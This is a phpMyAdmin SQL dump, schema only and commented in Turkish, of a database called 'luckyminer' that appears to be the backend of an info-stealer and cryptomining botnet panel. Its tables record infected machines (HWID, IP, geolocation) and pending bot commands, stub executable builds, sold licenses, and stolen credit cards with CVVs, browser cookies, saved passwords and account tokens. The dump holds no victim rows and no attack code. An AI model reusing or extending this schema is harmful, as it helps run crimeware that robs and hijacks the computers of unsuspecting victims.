-- phpMyAdmin SQL Dump
-- version 5.2.2
-- https://www.phpmyadmin.net/
--
-- Anamakine: localhost:3306
-- Üretim Zamanı: 29 Kas 2025, 09:49:05
-- Sunucu sürümü: 10.6.22-MariaDB-0ubuntu0.22.04.1
-- PHP Sürümü: 8.4.5

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
START TRANSACTION;
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- Veritabanı: `luckyminer`
--

-- --------------------------------------------------------

--
-- Tablo için tablo yapısı `accounts`
--

CREATE TABLE `accounts` (
  `id` int(11) NOT NULL,
  `Username` varchar(150) NOT NULL,
  `ip` varchar(100) NOT NULL,
  `LastCountry` varchar(50) DEFAULT NULL,
  `SecuirtyCountry` varchar(40) NOT NULL DEFAULT 'X',
  `FUDM` varchar(30) NOT NULL DEFAULT 'disabled',
  `Role` varchar(30) NOT NULL,
  `Pass` varchar(200) NOT NULL,
  `Email` varchar(150) NOT NULL,
  `OwnerKey` varchar(60) NOT NULL,
  `Webhook` text DEFAULT NULL,
  `WebhookScr` text DEFAULT NULL,
  `Wallets` text DEFAULT '||||||||',
  `GPUConfig` text DEFAULT '|||||||||||',
  `StubConfig` text NOT NULL DEFAULT 'enabled|enabled|enabled|enabled|disabled|enabled|enabled|enabled|',
  `MiningPower` varchar(50) NOT NULL DEFAULT '85',
  `RegisterDate` datetime NOT NULL DEFAULT current_timestamp()
) ENGINE=InnoDB DEFAULT CHARSET=latin1 COLLATE=latin1_swedish_ci;

-- --------------------------------------------------------

--
-- Tablo için tablo yapısı `actions`
--

CREATE TABLE `actions` (
  `ActionID` int(11) NOT NULL,
  `HWID` varchar(100) DEFAULT NULL,
  `ActionInfo` varchar(500) DEFAULT NULL,
  `ActionType` varchar(100) DEFAULT NULL,
  `ActionOwner` varchar(60) DEFAULT NULL,
  `ActionStatus` varchar(70) DEFAULT NULL,
  `ActionSentTime` varchar(100) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1 COLLATE=latin1_swedish_ci;

-- --------------------------------------------------------

--
-- Tablo için tablo yapısı `builder`
--

CREATE TABLE `builder` (
  `BuildID` int(11) NOT NULL,
  `OwnerID` varchar(60) NOT NULL,
  `BuildKey` varchar(60) NOT NULL,
  `ExeName` varchar(50) NOT NULL,
  `Icon` text DEFAULT NULL,
  `Extra` varchar(300) DEFAULT NULL,
  `Status` int(11) DEFAULT NULL,
  `BuildTime` varchar(50) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

-- --------------------------------------------------------

--
-- Tablo için tablo yapısı `cards`
--

CREATE TABLE `cards` (
  `CardID` int(11) NOT NULL,
  `Numbery` varchar(50) NOT NULL,
  `Expiry` varchar(30) NOT NULL,
  `CVV` varchar(30) NOT NULL,
  `Provider` varchar(50) NOT NULL,
  `Date` date NOT NULL DEFAULT current_timestamp(),
  `OwnerID` varchar(60) NOT NULL,
  `HWID` varchar(100) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb3 COLLATE=utf8mb3_general_ci;

-- --------------------------------------------------------

--
-- Tablo için tablo yapısı `cookies`
--

CREATE TABLE `cookies` (
  `CookieID` int(11) NOT NULL,
  `Urls` varchar(1000) NOT NULL,
  `expires_true` varchar(100) NOT NULL,
  `path` varchar(300) NOT NULL,
  `hostkeydot` varchar(100) NOT NULL,
  `expires_time` varchar(100) NOT NULL,
  `Names` varchar(500) DEFAULT NULL,
  `Cookie` varchar(5000) DEFAULT NULL,
  `OwnerID` varchar(50) NOT NULL,
  `HWID` varchar(50) NOT NULL,
  `Browser` varchar(50) DEFAULT NULL,
  `CookieDate` datetime NOT NULL DEFAULT current_timestamp(),
  `Profile` varchar(30) NOT NULL DEFAULT 'Default'
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb3 COLLATE=utf8mb3_general_ci;

-- --------------------------------------------------------

--
-- Tablo için tablo yapısı `licenses`
--

CREATE TABLE `licenses` (
  `LicenseID` int(11) NOT NULL,
  `GeneratedBy` varchar(50) DEFAULT NULL,
  `License` varchar(200) NOT NULL,
  `OwnerID` varchar(60) DEFAULT NULL,
  `UsedTime` varchar(100) DEFAULT NULL,
  `Duration` varchar(100) DEFAULT NULL,
  `Type` varchar(30) NOT NULL DEFAULT '2'
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb3 COLLATE=utf8mb3_general_ci;

-- --------------------------------------------------------

--
-- Tablo için tablo yapısı `logins`
--

CREATE TABLE `logins` (
  `LoginID` int(11) NOT NULL,
  `Role` varchar(50) NOT NULL,
  `Username` varchar(255) NOT NULL,
  `LoginData` text NOT NULL,
  `LoginIP` varchar(100) NOT NULL,
  `DateTime` varchar(200) NOT NULL DEFAULT current_timestamp(),
  `OwnerID` varchar(100) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb3 COLLATE=utf8mb3_general_ci;

-- --------------------------------------------------------

--
-- Tablo için tablo yapısı `miners`
--

CREATE TABLE `miners` (
  `BotID` int(11) NOT NULL,
  `HWID` varchar(100) CHARACTER SET utf8mb3 COLLATE utf8mb3_bin DEFAULT NULL,
  `PcName` varchar(150) CHARACTER SET utf8mb3 COLLATE utf8mb3_bin DEFAULT NULL,
  `Country` varchar(50) CHARACTER SET utf8mb3 COLLATE utf8mb3_bin DEFAULT NULL,
  `IP` varchar(50) CHARACTER SET utf8mb3 COLLATE utf8mb3_bin DEFAULT NULL,
  `OS` varchar(50) CHARACTER SET utf8mb3 COLLATE utf8mb3_bin DEFAULT NULL,
  `Rams` varchar(50) CHARACTER SET utf8mb3 COLLATE utf8mb3_bin DEFAULT NULL,
  `CPU` text DEFAULT NULL,
  `Hardware` varchar(50) CHARACTER SET utf8mb3 COLLATE utf8mb3_bin DEFAULT NULL,
  `InstallDate` varchar(50) CHARACTER SET utf8mb3 COLLATE utf8mb3_bin DEFAULT NULL,
  `LastPing` varchar(50) CHARACTER SET utf8mb3 COLLATE utf8mb3_bin DEFAULT NULL,
  `MinerPing` varchar(50) DEFAULT NULL,
  `lat` varchar(100) CHARACTER SET utf8mb3 COLLATE utf8mb3_bin DEFAULT NULL,
  `lon` varchar(100) CHARACTER SET utf8mb3 COLLATE utf8mb3_bin DEFAULT NULL,
  `accuracy` int(11) DEFAULT NULL,
  `mapsurl` text CHARACTER SET utf8mb3 COLLATE utf8mb3_bin DEFAULT NULL,
  `OwnerID` varchar(60) CHARACTER SET utf8mb3 COLLATE utf8mb3_bin DEFAULT NULL,
  `BuildID` varchar(100) CHARACTER SET utf8mb3 COLLATE utf8mb3_bin DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1 COLLATE=latin1_swedish_ci;

-- --------------------------------------------------------

--
-- Tablo için tablo yapısı `passwords`
--

CREATE TABLE `passwords` (
  `PassID` int(11) NOT NULL,
  `Urls` varchar(1000) NOT NULL,
  `Username` varchar(250) DEFAULT NULL,
  `Pass` varchar(200) DEFAULT NULL,
  `OwnerID` varchar(10) NOT NULL,
  `HWID` varchar(10) NOT NULL,
  `Browser` varchar(10) NOT NULL,
  `Profile` varchar(30) NOT NULL DEFAULT 'Default'
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb3 COLLATE=utf8mb3_general_ci;

-- --------------------------------------------------------

--
-- Tablo için tablo yapısı `tokens`
--

CREATE TABLE `tokens` (
  `TokenID` int(11) NOT NULL,
  `Token` varchar(300) NOT NULL,
  `UserID` varchar(100) DEFAULT NULL,
  `Username` varchar(100) DEFAULT NULL,
  `Email` varchar(100) DEFAULT NULL,
  `Phone` varchar(100) DEFAULT NULL,
  `verified` varchar(50) DEFAULT NULL,
  `nitro` int(11) DEFAULT NULL,
  `isvalid` varchar(30) NOT NULL,
  `pfp` varchar(300) NOT NULL,
  `HWID` varchar(100) NOT NULL,
  `OwnerID` varchar(60) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb3 COLLATE=utf8mb3_general_ci;

--
-- Dökümü yapılmış tablolar için indeksler
--

--
-- Tablo için indeksler `accounts`
--
ALTER TABLE `accounts`
  ADD PRIMARY KEY (`id`),
  ADD KEY `Username` (`Username`,`Pass`,`Email`,`OwnerKey`);

--
-- Tablo için indeksler `actions`
--
ALTER TABLE `actions`
  ADD PRIMARY KEY (`ActionID`),
  ADD KEY `HWID` (`HWID`,`ActionOwner`),
  ADD KEY `ActionSentTime` (`ActionSentTime`),
  ADD KEY `ActionStatus` (`ActionStatus`),
  ADD KEY `ActionType` (`ActionType`);

--
-- Tablo için indeksler `builder`
--
ALTER TABLE `builder`
  ADD PRIMARY KEY (`BuildID`),
  ADD KEY `Status` (`Status`,`BuildTime`);

--
-- Tablo için indeksler `cards`
--
ALTER TABLE `cards`
  ADD PRIMARY KEY (`CardID`),
  ADD KEY `OwnerID` (`OwnerID`,`HWID`);

--
-- Tablo için indeksler `cookies`
--
ALTER TABLE `cookies`
  ADD PRIMARY KEY (`CookieID`),
  ADD KEY `OwnerID` (`OwnerID`,`HWID`,`CookieDate`);

--
-- Tablo için indeksler `licenses`
--
ALTER TABLE `licenses`
  ADD PRIMARY KEY (`LicenseID`);

--
-- Tablo için indeksler `logins`
--
ALTER TABLE `logins`
  ADD PRIMARY KEY (`LoginID`);

--
-- Tablo için indeksler `miners`
--
ALTER TABLE `miners`
  ADD PRIMARY KEY (`BotID`),
  ADD KEY `HWID` (`HWID`,`OwnerID`),
  ADD KEY `PcName` (`PcName`,`Country`,`IP`);

--
-- Tablo için indeksler `passwords`
--
ALTER TABLE `passwords`
  ADD PRIMARY KEY (`PassID`),
  ADD KEY `OwnerID` (`OwnerID`,`HWID`);

--
-- Tablo için indeksler `tokens`
--
ALTER TABLE `tokens`
  ADD PRIMARY KEY (`TokenID`),
  ADD KEY `HWID` (`HWID`,`OwnerID`);

--
-- Dökümü yapılmış tablolar için AUTO_INCREMENT değeri
--

--
-- Tablo için AUTO_INCREMENT değeri `accounts`
--
ALTER TABLE `accounts`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;

--
-- Tablo için AUTO_INCREMENT değeri `actions`
--
ALTER TABLE `actions`
  MODIFY `ActionID` int(11) NOT NULL AUTO_INCREMENT;

--
-- Tablo için AUTO_INCREMENT değeri `builder`
--
ALTER TABLE `builder`
  MODIFY `BuildID` int(11) NOT NULL AUTO_INCREMENT;

--
-- Tablo için AUTO_INCREMENT değeri `cards`
--
ALTER TABLE `cards`
  MODIFY `CardID` int(11) NOT NULL AUTO_INCREMENT;

--
-- Tablo için AUTO_INCREMENT değeri `cookies`
--
ALTER TABLE `cookies`
  MODIFY `CookieID` int(11) NOT NULL AUTO_INCREMENT;

--
-- Tablo için AUTO_INCREMENT değeri `licenses`
--
ALTER TABLE `licenses`
  MODIFY `LicenseID` int(11) NOT NULL AUTO_INCREMENT;

--
-- Tablo için AUTO_INCREMENT değeri `logins`
--
ALTER TABLE `logins`
  MODIFY `LoginID` int(11) NOT NULL AUTO_INCREMENT;

--
-- Tablo için AUTO_INCREMENT değeri `miners`
--
ALTER TABLE `miners`
  MODIFY `BotID` int(11) NOT NULL AUTO_INCREMENT;

--
-- Tablo için AUTO_INCREMENT değeri `passwords`
--
ALTER TABLE `passwords`
  MODIFY `PassID` int(11) NOT NULL AUTO_INCREMENT;

--
-- Tablo için AUTO_INCREMENT değeri `tokens`
--
ALTER TABLE `tokens`
  MODIFY `TokenID` int(11) NOT NULL AUTO_INCREMENT;
COMMIT;

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
